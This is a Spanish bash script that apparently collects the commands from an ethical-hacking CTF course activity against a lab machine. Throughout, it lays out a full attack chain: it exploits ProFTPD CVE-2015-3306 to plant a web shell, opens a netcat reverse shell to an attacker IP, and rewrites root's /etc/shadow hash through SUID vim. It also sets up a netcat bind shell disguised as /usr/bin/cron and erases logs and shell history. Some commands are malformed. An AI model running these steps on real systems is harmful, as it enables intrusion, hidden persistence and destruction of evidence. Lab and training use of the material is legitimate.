#!/bin/bash

# ===============================================
# Actividad 5 - DDLR Pwneable 1: Comandos de Hacking Ético
# Extracción de comandos del documento Actividad 5 - DDLR Pwneable 1.pdf
# ===============================================

# Variables de Configuración (Ajustar según la red)
TARGET_IP="172.17.0.2"
ATTACKER_IP="192.168.100.12"
LISTENER_PORT="4444"
PERSISTENCE_PORT="8080"
SALT_GEN_PASS="ABC12345"

## 1. Descubrimiento y Explotación (FTP - CVE-2015-3306)
echo "--- 1. Descubrimiento de Puertos y Explotación de FTP (ProFTPD 1.3.5) ---"

# Escaneo inicial de puertos (21/ftp, 22/ssh, 80/http)
# nmap -sV $TARGET_IP

# Ejecución del exploit (CVE-2015-3306) para crear una shell en /var/www/html/backdoor.php
# El exploit necesita el archivo 'exploit.py' con el código proporcionado en el PDF.
python3 exploit.py --host $TARGET_IP --port 21 --path "/var/www/html/"

echo -e "\n--- 2. Obtención de Reverse Shell (Desde la Web Shell) ---"

# 2.1. Configurar listener en la máquina del atacante (Host)
# nc -lvnp $LISTENER_PORT

# 2.2. Inyectar comando en la URL para obtener la reverse shell:
# URL: http://$TARGET_IP/backdoor.php?cmd=$(which%20nc)%20-e%20/bin/bash%20$ATTACKER_IP%20$LISTENER_PORT

# 2.3. Mejorar la shell después de la conexión (para evitar guardar registros):
script /dev/null -c bash
export TERM=xterm
export SHELL=bash
stty raw -echo; fg
reset

## 3. Escalada de Privilegios (SUID - vim.basic)
echo -e "\n--- 3. Escalada de Privilegios (SUID en /usr/bin/vim.basic) ---"

# 3.1. Buscar binarios SUID
find / -perm -4000 -type f 2>/dev/null

# 3.2. Generar un nuevo hash de contraseña para '1234' (para inyectar en /etc/shadow)
openssl passwd -6 -salt $SALT_GEN_PASS 1234
# Hash generado: $6$ABC12345$k9hDeQpxGgZFJV9uC0i6kVVJH9RnaUt7PUuztP2GQCqgrgmiFIERolla2TBX3I4fXl/xh7EUsY6ZEruCxY3sh1

# 3.3. Editar /etc/shadow usando VIM (ejecutar en la shell www-data):
# /usr/bin/vim.basic /etc/shadow
# Modificar la línea de 'root' con el nuevo hash:
# root:$6$ABC12345$k9hDeQpxGgZFJV9uC0i6kVVJH9RnaUt7PUuztP2GQCqgrgmiFIERolla2TBX3I4fXl/xh7EUsY6ZEruCxY3sh1:19914:0:99999:7:::

# 3.4. Obtener shell de root con el nuevo password:
# su 
# Password: 1234

# 3.5. Obtener la flag de root:
# cat /root/flag.txt

## 4. Persistencia (Como root)
echo -e "\n--- 4. Persistencia (Netcat en /usr/bin/cron) ---"

# 4.1. Creación del script de persistencia en /usr/bin/cron:
# #!/bin/bash
# while true; do
# nc -l -p $PERSISTENCE_PORT -e '/bin/bash'
# done

# 4.2. Persistencia con systemd (Nota: No funciona en Docker, pero se incluye para documentación):
# Comando para crear el servicio /etc/systemd/system/cron.service y ejecutar systemctl
# sudo systemctl daemon-reload
# sudo systemctl enable cron.service
# sudo systemctl start cron.service

## 5. Log Zapping (Limpieza de Vestigios)
echo -e "\n--- 5. Log Zapping (Limpieza Final) ---"

# 5.1. Limpieza de IPs (Reemplazar $ATTACKER_IP por 0.0.0.0 en todos los archivos con permisos de escritura)
find / -type f -exec sed -i 's/$ATTACKER_IP/0.0.0.0/g' {} + 2>/dev/null

# 5.2. Comando para identificar archivos de logs relevantes (incluyendo rastros de flag)
# find / -type f \(-name "*.php" -o-name "*.txt" \) -print | xargs - grep -HnFF 'ddlr{' 2>/dev/null
# find / -type f \(-name "*.php" -o-name "*.txt" \) -print | xargs -0 grep HnF 'ddlr' 2>/dev/null

# 5.3. Eliminación del backdoor de la web:
# rm /var/www/html/backdoor.php

# 5.4. Limpieza del historial de comandos de shell:
# truncate -s 0 /root/.bash_history
